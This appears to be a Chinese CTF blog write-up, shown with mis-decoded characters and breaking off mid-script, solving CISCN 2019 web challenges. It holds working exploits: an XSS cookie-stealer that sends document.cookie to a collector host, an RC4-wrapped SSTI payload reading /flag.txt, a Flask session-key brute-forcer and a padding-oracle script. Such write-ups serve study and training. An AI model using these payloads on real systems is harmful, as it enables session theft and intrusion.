Web2ï¼ˆå­˜å‚¨å‹xss+sqlæ³¨å…¥ï¼‰</h1><p>é¢˜ç›®ç®—æ˜¯æ¯”è¾ƒä¼ ç»Ÿçš„xssè§¦å‘æ¨¡å¼äº†ã€‚æ³¨å†Œç™»å½•åä¸€ä¸ªè¾“å…¥æ¡†å…è®¸æˆ‘ä»¬ä½¿ç”¨xsspayloadï¼Œè¿˜æœ‰ä¸€ä¸ªç•Œé¢è¾“å…¥éªŒè¯ç åè§¦å‘boté˜…è¯»ã€‚æˆ‘ä»¬ç›®æ ‡å°±æ˜¯æ‰“åˆ°adminçš„cookieã€‚</p><p>é¦–å…ˆå°è¯•æ€§å¼¹ä¸ªçª—ï¼Œç»“æœåœ¨é¡µé¢é‡Œçœ‹åˆ°ä¸ªè‡ªå·±æœ‰å¿ƒç†é˜´å½±çš„CSPé™åˆ¶ã€‚</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;meta http-equiv=<span class="string">"content-security-policy"</span> content=<span class="string">"default-src 'self'; script-src 'unsafe-inline' 'unsafe-eval'"</span>&gt;</span><br></pre></td></tr></table></figure><p>å¥½åœ¨cspè§„åˆ™ä¸ç®—æ¯”è¾ƒä¸¥æ ¼ã€‚å› ä¸º<code>&#39;unsafe-inline&#39; &#39;unsafe-eval&#39;</code>å…è®¸æˆ‘ä»¬åŠ è½½ä¸€æ®µå†…è”jsä»£ç æ‰§è¡Œã€‚è€Œè§£å†³è¿™ä¸ªçš„åŠæ³•åªéœ€ä½¿ç”¨<code>window.location.href</code>å°±å¯ç»•è¿‡ã€‚è¿™é‡Œå› ä¸ºæœ‰buuojæä¾›çš„xsså¹³å°ï¼Œæ‰€ä»¥ç›´æ¥ç”¨ç”Ÿæˆçš„ä»£ç æ‰“ä¸€æ‰“çœ‹çœ‹ã€‚å‘ç°æœ‰è¿‡æ»¤ä¸è½¬æ¢ï¼Œä¼°è®¡å¾—å®ä½“ç¼–ç ç»•è¿‡ã€‚<br>æŠŠxsså¹³å°ç”Ÿæˆçš„payloadæ”¹æˆå®ä½“ç¼–ç ï¼š(æ³¨æ„idå€¼æ˜¯ç”Ÿæˆä»£ç é‡Œçš„idï¼Œä¸€å¼€å§‹ä»¥ä¸ºæ˜¯é¡¹ç›®åidåŠå¤©æ‰“ä¸åˆ°)</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;<span class="built_in">window</span>.location.href=<span class="string">'http://ip:port/index.php?do=api&amp;id=ex0I6K&amp;location='</span>+<span class="built_in">escape</span>((<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;<span class="keyword">try</span>&#123;<span class="keyword">return</span> <span class="built_in">document</span>.location.href&#125;<span class="keyword">catch</span>(e)&#123;<span class="keyword">return</span> <span class="string">''</span>&#125;&#125;)())+<span class="string">'&amp;toplocation='</span>+<span class="built_in">escape</span>((<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;<span class="keyword">try</span>&#123;<span class="keyword">return</span> top.location.href&#125;<span class="keyword">catch</span>(e)&#123;<span class="keyword">return</span> <span class="string">''</span>&#125;&#125;)())+<span class="string">'&amp;cookie='</span>+<span class="built_in">escape</span>((<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;<span class="keyword">try</span>&#123;<span class="keyword">return</span> <span class="built_in">document</span>.cookie&#125;<span class="keyword">catch</span>(e)&#123;<span class="keyword">return</span> <span class="string">''</span>&#125;&#125;)())+<span class="string">'&amp;opener='</span>+<span class="built_in">escape</span>((<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;<span class="keyword">try</span>&#123;<span class="keyword">return</span> (<span class="built_in">window</span>.opener &amp;&amp; <span class="built_in">window</span>.opener.location.href)?<span class="built_in">window</span>.opener.location.href:<span class="string">''</span>&#125;<span class="keyword">catch</span>(e)&#123;<span class="keyword">return</span> <span class="string">''</span>&#125;&#125;)());&#125;)();</span><br></pre></td></tr></table></figure><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;svg&gt;<span class="xml"><span class="tag">&lt;<span class="name">script</span>&gt;</span>å®ä½“ç¼–ç payload<span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br></pre></td></tr></table></figure><p>æäº¤åè®¿é—®é¡µé¢ï¼Œå¯ä»¥çœ‹åˆ°å¹³å°æ˜¯èƒ½æ”¶åˆ°cookieçš„ï¼Œé‚£å°±ä¸éœ€è¦å…³å¿ƒå…¶ä»–çš„ï¼Œç›´æ¥å»åé¦ˆé¡µé¢è·‘æ®µè„šæœ¬çˆ†ç ´éªŒè¯ç æäº¤å³å¯ã€‚ç­‰å¾…botç‚¹å‡»é¡µé¢ï¼Œä¹‹åå¹³å°æ”¶åˆ°cookie<br><img src="/2020/02/19/CISCN-2019-web%E9%83%A8%E5%88%86%E5%A4%8D%E7%8E%B0/5.PNG" class="lazyload" data-srcset="5.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="cookie"><br>ä¿®æ”¹ç™»å½•è¿›å…¥admin.phpåå°ï¼Œä¸€ä¸ªæ˜æ˜¾çš„sqlæ³¨å…¥ç›´æ¥è”åˆæŸ¥è¯¢å³å¯ã€‚3ä¸ªå­—æ®µï¼Œå›æ˜¾ç¬¬2,3ä¸ª<br><img src="/2020/02/19/CISCN-2019-web%E9%83%A8%E5%88%86%E5%A4%8D%E7%8E%B0/flag5.PNG" class="lazyload" data-srcset="flag5.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="flag"></p><h1 id="double-secrect-ssti"><a href="#double-secrect-ssti" class="headerlink" title="double secrect (ssti)"></a>double secrect (ssti)</h1><p>åŸºæœ¬ä¸Šå”¬äººçš„æˆåˆ†æ¯”è¾ƒå¤§ã€‚å› ä¸ºä¸€å¼€å§‹è¿›å…¥é¢˜ç›®åªæœ‰ä¸€å¥<code>Welcome To Find Secret</code>ï¼Œä¹‹åè®¿é—®robots.txtå‘ç°å±…ç„¶æŠ¥this is android ctfï¼Œè®©æˆ‘ä»¥ä¸ºçœ‹é”™é¢˜äº†ã€‚ä½†å…¶å®è®¿é—®secretè·¯ç”±å¹¶ä¼ å‚secretæ—¶ï¼Œå‘ç°ä¼šæœ‰å›æ˜¾ã€‚å½“å›æ˜¾å­—æ•°å¤šçš„æ—¶å€™å‡ºç°pythonæŠ¥é”™ï¼Œå¯ä»¥çŒœæµ‹æ˜¯sstiã€‚è¿™é‡Œæˆ‘å°è¯•ç›´æ¥ä¼ ä¸€æ®µä¸­æ–‡ï¼Œå…¶å®asciiç æ¯”è¾ƒå¤§çš„æ–‡å­—ä¹Ÿä¼šè§¦å‘æŠ¥é”™ï¼Œçˆ†å‡ºé‡è¦æºç ï¼š<br><img src="/2020/02/19/CISCN-2019-web%E9%83%A8%E5%88%86%E5%A4%8D%E7%8E%B0/6.PNG" class="lazyload" data-srcset="6.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="RC4"></p><p>åŸæ¥æ˜¯æ®µåŠ å¯†ï¼Œè€Œä¸”çˆ†å‡ºçš„æºç è¿keyå€¼éƒ½ç»™äº†ã€‚é‚£ä¹ˆç›´æ¥RC4åŠ å¯†æˆ‘ä»¬çš„ssti payloadåŸºæœ¬å°±å®Œäº‹äº†ã€‚<br>exp:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">RC4</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, key)</span>:</span></span><br><span class="line">        self.key = key</span><br><span class="line">        self.key_length = len(key)</span><br><span class="line">        self._init_S_box()</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">_init_S_box</span><span class="params">(self)</span>:</span></span><br><span class="line">        self.Box = [i <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">256</span>)]</span><br><span class="line">        k = [self.key[i % self.key_length] <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">256</span>)]</span><br><span class="line">        j = <span class="number">0</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">256</span>):</span><br><span class="line">            j = (j + self.Box[i] + ord(k[i])) % <span class="number">256</span></span><br><span class="line">            self.Box[i], self.Box[j] = self.Box[j], self.Box[i]</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">crypt</span><span class="params">(self, plaintext)</span>:</span></span><br><span class="line">        i = <span class="number">0</span></span><br><span class="line">        j = <span class="number">0</span></span><br><span class="line">        result = <span class="string">''</span></span><br><span class="line">        <span class="keyword">for</span> ch <span class="keyword">in</span> plaintext:</span><br><span class="line">            i = (i + <span class="number">1</span>) % <span class="number">256</span></span><br><span class="line">            j = (j + self.Box[i]) % <span class="number">256</span></span><br><span class="line">            self.Box[i], self.Box[j] = self.Box[j], self.Box[i]</span><br><span class="line">            t = (self.Box[i] + self.Box[j]) % <span class="number">256</span></span><br><span class="line">            result += chr(self.Box[t] ^ ord(ch))</span><br><span class="line">        <span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line">url=<span class="string">'http://7318e5d2-ecf4-4961-b115-4f1eb3b11c4a.node3.buuoj.cn/secret?secret='</span></span><br><span class="line">a = RC4(<span class="string">'HereIsTreasure'</span>)</span><br><span class="line">cmd=<span class="string">"&#123;&#123;''.__class__.__mro__[2].__subclasses__()[40]('/flag.txt').read()&#125;&#125;"</span></span><br><span class="line">payload = urllib.parse.quote(a.crypt(cmd))</span><br><span class="line">res = requests.get(url + payload)</span><br><span class="line">print(res.text)</span><br></pre></td></tr></table></figure><h1 id="åä¸œå—èµ›åŒº-Web4-flask-session-cookieä¼ªé€ "><a href="#åä¸œå—èµ›åŒº-Web4-flask-session-cookieä¼ªé€ " class="headerlink" title="åä¸œå—èµ›åŒº Web4 (flask session cookieä¼ªé€ )"></a>åä¸œå—èµ›åŒº Web4 (flask session cookieä¼ªé€ )</h1><p>è¢«æ²¡å¿…è¦çš„æƒ…å†µç»™æµªè´¹äº†æ—¶é—´â€¦â€¦ä¸»è¦æ˜¯ç¯å¢ƒé—®é¢˜ï¼Œå¿ƒé‡Œè‹¦å•Šã€‚<br>é¦–å…ˆé¢˜ç›®ç»™äº†ä¸€ä¸ªå‚æ•°å¯ä»¥è¯»å–æ–‡ä»¶ï¼Œç”±äºè·¯ç”±åç§°ï¼Œå…ˆçœ‹ä¸‹æºç app.py</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># encoding:utf-8 </span></span><br><span class="line"><span class="keyword">import</span> re, random, uuid, </span><br><span class="line">urllib <span class="keyword">from</span> flask </span><br><span class="line"><span class="keyword">import</span> Flask, session, request </span><br><span class="line">app = Flask(__name__) </span><br><span class="line">random.seed(uuid.getnode()) </span><br><span class="line">app.config[<span class="string">'SECRET_KEY'</span>] = str(random.random()*<span class="number">233</span>) </span><br><span class="line">app.debug = <span class="literal">True</span> @app.route(<span class="string">'/'</span>) </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span><span class="params">()</span>:</span> </span><br><span class="line">    session[<span class="string">'username'</span>] = <span class="string">'www-data'</span> </span><br><span class="line">    <span class="keyword">return</span> <span class="string">'Hello World! Read somethings'</span> </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/read') </span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">read</span><span class="params">()</span>:</span> </span><br><span class="line">    <span class="keyword">try</span>: url = request.args.get(<span class="string">'url'</span>) </span><br><span class="line">         m = re.findall(<span class="string">'^file.*'</span>, url, re.IGNORECASE) </span><br><span class="line">         n = re.findall(<span class="string">'flag'</span>, url, re.IGNORECASE) </span><br><span class="line">         <span class="keyword">if</span> m <span class="keyword">or</span> n: <span class="keyword">return</span> <span class="string">'No Hack'</span> </span><br><span class="line">            res = urllib.urlopen(url) </span><br><span class="line">            <span class="keyword">return</span> res.read() </span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> ex: </span><br><span class="line">        <span class="keyword">print</span> str(ex) </span><br><span class="line">        <span class="keyword">return</span> <span class="string">'no response'</span> </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/flag') </span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">flag</span><span class="params">()</span>:</span> </span><br><span class="line">    <span class="keyword">if</span> session <span class="keyword">and</span> session[<span class="string">'username'</span>] == <span class="string">'fuck'</span>: </span><br><span class="line">        <span class="keyword">return</span> open(<span class="string">'/flag.txt'</span>).read() </span><br><span class="line">    <span class="keyword">else</span>: </span><br><span class="line">        <span class="keyword">return</span> <span class="string">'Access denied'</span> </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">'__main__'</span>: </span><br><span class="line">    app.run( debug=<span class="literal">True</span>, host=<span class="string">"0.0.0.0"</span> )</span><br></pre></td></tr></table></figure><p>å¯ä»¥çœ‹åˆ°åªè¦ä¼ªé€ <code>session[&#39;username&#39;]</code>çš„å€¼å°±å¯ä»¥æ‹¿åˆ°flagäº†ã€‚ç”±äºè¿™é‡Œçš„éšæœºæ•°ç§å­<code>SECRECT_KEY</code>å¾ˆè½»æ¾å°±å¯ä»¥ä¼ªé€ ï¼Œæ‰€ä»¥ç›´æ¥ä¸Šè„šæœ¬çˆ†ç ´å¹¶ç”Ÿæˆcookieå€¼</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> flask_session_cookie_manager2</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line">mac = <span class="string">"02:42:ae:00:d0:09"</span></span><br><span class="line">random.seed(int(mac.replace(<span class="string">":"</span>, <span class="string">""</span>), <span class="number">16</span>))</span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> range(<span class="number">1000</span>):</span><br><span class="line">    key = str(random.random() * <span class="number">233</span>)</span><br><span class="line">    result = flask_session_cookie_manager2.FSCM.decode(<span class="string">'eyJ1c2VybmFtZSI6eyIgYiI6ImQzZDNMV1JoZEdFPSJ9fQ.XljQxQ.zBqq36UiMEIrykW9oqSlvg4wBkw'</span>, key)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">'error'</span> <span class="keyword">not</span> <span class="keyword">in</span> result:</span><br><span class="line">        result[<span class="string">u'username'</span>] = <span class="string">'fuck'</span></span><br><span class="line">        <span class="keyword">print</span> flask_session_cookie_manager2.FSCM.encode(key, str(result))</span><br><span class="line">        exit()</span><br></pre></td></tr></table></figure><p>ç†è®ºä¸Šæ”¹cookieå°±å®Œäº‹äº†ï¼Œä½†æ˜¯æˆ‘ç™½èŠ±äº†ä¸€ä¸ªå¤šå°æ—¶ï¼Œå› ä¸ºè™šæ‹Ÿæœºçš„py2çš„ç¯å¢ƒæœ‰é—®é¢˜ã€‚æœŸé—´è¿˜å‘ç°ï¼ŒåŸæ¥å‚æ•°ä¸å˜æ—¶ç”Ÿæˆçš„cookieä¹Ÿä¼šå› ä¸ºæ—¶é—´åŸå› è€Œä¸åŒã€‚<br><img src="/2020/02/19/CISCN-2019-web%E9%83%A8%E5%88%86%E5%A4%8D%E7%8E%B0/7.PNG" class="lazyload" data-srcset="7.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="ä¸åŒçš„æ—¶é—´æˆ³å¯¼è‡´å€¼ä¸åŒ"><br>å½“ç„¶è¿™å¹¶ä¸å½±å“ç»“æœã€‚åªè¦æ˜¯python2ç†è®ºä¸Šå°±æ²¡æœ‰é—®é¢˜ã€‚<br>æœ€åè¿˜æ˜¯åœ¨vpsä¸Šè·‘çš„è„šæœ¬æ‰æ‹¿åˆ°flagâ€¦â€¦</p><h1 id="PointSystem-PaddingOracle-cbcç¿»è½¬"><a href="#PointSystem-PaddingOracle-cbcç¿»è½¬" class="headerlink" title="PointSystem(PaddingOracle+cbcç¿»è½¬)"></a>PointSystem(PaddingOracle+cbcç¿»è½¬)</h1><p>é¢˜ç›®éš¾åº¦æŒºå¤§çš„ï¼Œå‰åè¿˜æ‹–äº†ä¸å°‘æ—¶é—´ï¼Œæœ€åå‚è€ƒäº†å‡ºé¢˜äººèµµå¸ˆå‚…çš„wpæ‰å‹‰å¼ºå†™å‡ºæ¥çš„ã€‚å…¶ä¸­æ¶‰åŠPaddingOracle+CBCç¿»è½¬æ”»å‡»çš„çŸ¥è¯†æ¶‰åŠå¯†ç å­¦ï¼Œè‡ªå·±æ‰€çŸ¥ç”šå°‘ï¼ŒåŸæ¥ä¹Ÿåªå¥—è¿‡è„šæœ¬åšè¿‡ä¸€é“paddingoracleçš„é¢˜ç›®ã€‚æ‰€ä»¥å…ˆæŠŠè§£é¢˜è¿‡ç¨‹æ”¾ä¸€ä¸‹ï¼ŒæŠ½ç©ºæŠŠpadding oracleç­‰ç­‰åŠ å¯†åŸç†ç†è§£ä¸‹ã€‚</p><p>é¦–å…ˆé¢˜ç›®ä»robots.txtä¸­è·å–ä¿¡æ¯ï¼Œè¿›å…¥<code>swagger-ui.html</code>ï¼Œå¯ä»¥çœ‹åˆ°æœ‰è®¸å¤šapiæ¥å£çš„ä½¿ç”¨ã€‚<img src="/2020/02/19/CISCN-2019-web%E9%83%A8%E5%88%86%E5%A4%8D%E7%8E%B0/8.PNG" class="lazyload" data-srcset="8.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="api"><br>ä¸€å¼€å§‹å°è¯•èƒ½å¦ç›´æ¥åœ¨è¿™ä¸ªç•Œé¢è¿›è¡Œå‘½ä»¤æ‰§è¡Œï¼Œæ¯”å¦‚æ³¨å†Œæˆ–è€…pingä¹‹ç±»çš„ã€‚ä½†æ˜¯å‘ç°å¹¶ä¸å¯è¡Œã€‚ä¸è¿‡æˆ‘ä»¬æ—¢ç„¶çŸ¥é“æœ‰æ³¨å†Œæ¥å£ï¼Œç›´æ¥æŒ‰ç…§æ ¼å¼åˆ©ç”¨æ¥å£æ³¨å†Œä¸€ä¸ªè´¦å·å°±å¥½äº†ã€‚<br>æ³¨å†Œåå°è¯•ç™»å½•ï¼Œå´æ„å¤–å‘ç°å­˜åœ¨æƒé™ä¸å¤Ÿçš„é—®é¢˜ã€‚</p><p><img src="/2020/02/19/CISCN-2019-web%E9%83%A8%E5%88%86%E5%A4%8D%E7%8E%B0/9.PNG" class="lazyload" data-srcset="9.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="æƒé™"><br>ä½†æ˜¯åœ¨burpsuiteä¸­æ„å¤–å‘ç°äº†é™¤äº†ä¸€ä¸ªç™»å½•çš„poståŒ…ï¼Œè¿˜æœ‰ä¸€ä¸ªgetè¯·æ±‚äº†æœªçŸ¥çš„apiå¹¶è¿”å›ä¿¡æ¯ã€‚<br><img src="/2020/02/19/CISCN-2019-web%E9%83%A8%E5%88%86%E5%A4%8D%E7%8E%B0/10.PNG" class="lazyload" data-srcset="10.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="info"><br>å°†ç™»å½•æ‰€è¿”å›çš„ä¸€æ®µbase64è¿›è¡Œè§£ç å¾—åˆ°ï¼š</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="attr">"signed_key"</span>:<span class="string">"SUN4a1NpbmdEYW5jZVJhUHsFQR4ln5VFC9L09echkYhTWQgiwZohj27JWt98/+1ZOzOMzVHlzkkVTuw8vkgQOwMZ2B5Leaq0Gc+rzoKtQdjsiMrpsSBq/QvWKTHYKxBHN0JzlQd6bXhFdSUa4slA7g=="</span>,<span class="attr">"role"</span>:<span class="number">3</span>,<span class="attr">"user_id"</span>:<span class="number">1</span>,<span class="attr">"payload"</span>:<span class="string">"CHAkpjTggDemZY7gzXBvbR2WeXJ47cfj"</span>,<span class="attr">"expire_in"</span>:<span class="number">1582905111</span>&#125;</span><br></pre></td></tr></table></figure><p>è€Œå‰é¢çš„<code>signed_key</code>ä¹Ÿè¿›è¡Œbase64è§£ç çš„è¯ï¼Œä¼šå‘ç°å†…å®¹ç”±æ˜æ–‡+å¯†æ–‡ç»„åˆèµ·æ¥äº†ã€‚è¯´æ˜æœ‰å¯èƒ½æœåŠ¡å™¨é‡‡å–cbcæ¨¡å¼åŠ å¯†ã€‚æˆ‘ä»¬è¦åšçš„å°±æ˜¯paddingoracleç ´è§£å‡ºç»“æ„å¹¶cbcç¿»è½¬ä¸€ä¸‹ã€‚<br>padding oracleexp:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"></span><br><span class="line">host = <span class="string">"d46d6658-3bdd-48d9-8600-ee320a2a837a.node3.buuoj.cn"</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">padding_oracle</span><span class="params">(key)</span>:</span></span><br><span class="line">    user_key_decode = base64.b64decode(key)</span><br><span class="line">    user_key_json_decode = json.loads(user_key_decode)</span><br><span class="line">    signed_key = user_key_json_decode[<span class="string">'signed_key'</span>]</span><br><span class="line">    signed_key_decoded = base64.b64decode(signed_key)</span><br><span class="line">    url = <span class="string">"http://"</span> + host + <span class="string">"/frontend/api/v1/user/info"</span></span><br><span class="line"></span><br><span class="line">    N = <span class="number">16</span></span><br><span class="line"></span><br><span class="line">    total_plain = <span class="string">''</span></span><br><span class="line">    <span class="keyword">for</span> block <span class="keyword">in</span> range(<span class="number">0</span>, len(signed_key_decoded) // <span class="number">16</span> - <span class="number">1</span>):</span><br><span class="line">        print(block)</span><br><span class="line">        token = <span class="string">''</span></span><br><span class="line">        get = <span class="string">b""</span></span><br><span class="line">        cipher = signed_key_decoded[<span class="number">16</span> + block * <span class="number">16</span>:<span class="number">32</span> + block * <span class="number">16</span>]</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>, N+<span class="number">1</span>):</span><br><span class="line">            <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">0</span>, <span class="number">256</span>):</span><br><span class="line">                time.sleep(<span class="number">0.2</span>)</span><br><span class="line">                padding = <span class="string">b""</span>.join([(get[n] ^ i).to_bytes(<span class="number">1</span>, <span class="string">'little'</span>) <span class="keyword">for</span> n <span class="keyword">in</span> range(len(get))])</span><br><span class="line">                c = <span class="string">b'\x00'</span> * (<span class="number">16</span> - i) + j.to_bytes(<span class="number">1</span>, <span class="string">'little'</span>) + padding + cipher</span><br><span class="line">                <span class="comment">#print(c)</span></span><br><span class="line">                token = base64.b64encode(c)</span><br><span class="line">                user_key_json_decode[<span class="string">'signed_key'</span>] = token.decode(<span class="string">"utf-8"</span>)</span><br><span class="line">                header = &#123;<span class="string">'Key'</span>: base64.b64encode(bytes(json.dumps(user_key_json_decode), <span class="string">"utf-8"</span>))&#125;</span><br><span class="line">                res = requests.get(url, headers=header)</span><br><span class="line">                <span class="keyword">if</span> <span class="string">'å°‘å¥³'</span> <span class="keyword">in</span> res.text:</span><br><span class="line">                    print(<span class="string">'404 error occured!'</span>)</span><br><span class="line">                    time.sleep(<span class="number">15.0</span>)</span><br><span class="line">                    res = requests.get(url, headers=header)</span><br><span class="line">                <span class="keyword">if</span> res.json()[<span class="string">'code'</span>] == <span class="number">206</span>:</span><br><span class="line">                    get = (j ^ i).to_bytes(<span class="number">1</span>, <span class="string">'little'</span>) + get</span><br><span class="line">                    print(i,get)</span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">        plain = <span class="string">b""</span>.join([(get[i] ^ signed_key_decoded[block * <span class="number">16</span> + i]).to_bytes(<span class="number">1</span>, <span class="string">'little'</span>) <span class="keyword">for</span> i <span class="keyword">in</span> range(N)])</span><br><span class="line">        print(plain.decode(<span class="string">"utf-8"</span>), <span 